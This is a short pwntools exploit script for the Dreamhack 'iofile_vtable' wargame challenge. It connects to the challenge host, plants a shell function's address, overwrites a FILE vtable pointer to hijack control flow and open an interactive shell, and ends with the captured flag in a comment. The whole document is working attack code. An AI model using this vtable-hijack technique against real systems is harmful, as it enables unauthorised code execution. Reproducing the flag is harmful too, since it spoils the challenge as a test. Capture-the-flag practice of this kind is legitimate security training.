from pwn import *

# p = process("./iofile_vtable")
p = remote("host1.dreamhack.games",8482)

shell = 0x40094a
name = 0x6010d0

p.sendlineafter("name:",p64(shell))

p.sendlineafter(">",str(4))

p.sendlineafter("change:",p64(name-0x38))
p.sendlineafter(">",str(2))

p.interactive()

#DH{9f746608b2c9239b6b80eb5bbcae06ed}